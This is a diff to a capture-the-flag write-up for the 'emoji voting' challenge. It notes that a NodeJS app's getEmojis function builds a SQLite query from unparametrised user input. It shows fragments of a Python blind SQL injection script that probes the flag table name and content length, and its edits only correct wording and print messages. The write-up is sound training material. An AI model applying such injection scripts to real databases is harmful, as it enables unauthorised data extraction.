@@ -145,7 +145,7 @@ CHTB{sw33t_l33t_s3r14lzz_@$#?}
 
 ## # emoji voting
 
-We are given source code of the application, The application is based on NodeJS and uses SQLite database. we can see on the "challenge/views/database.js" file the "getEmojis" function does not use parametrization before adding user input to SQL query:
+We are given source code of the application, The application is based on NodeJS and uses SQLite database. We can see on the "challenge/views/database.js" file the "getEmojis" function does not use parametrization before adding user input to SQL query:
 
 ![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053017.png)
 
@@ -192,7 +192,7 @@ def sqli():
 			dataLength = i
 			break 
 
-	print("\n\n[+] Found flag length: %s\n" % dataLength)
+	print("\n\n[+] Found tablename length: %s\n" % dataLength)
 
 	flag_table = 'flag_'
 
@@ -216,7 +216,7 @@ def sqli():
 	print("\n\n[+] Extracted flag tablename: %s\n" % flag_table)
 
 	
-	# get length of flag table name
+	# get length of flag content
 	left = '(select length(flag) from %s)' % flag_table
 
 	for i in range(1,70): # guessing flag would be max 70 chars
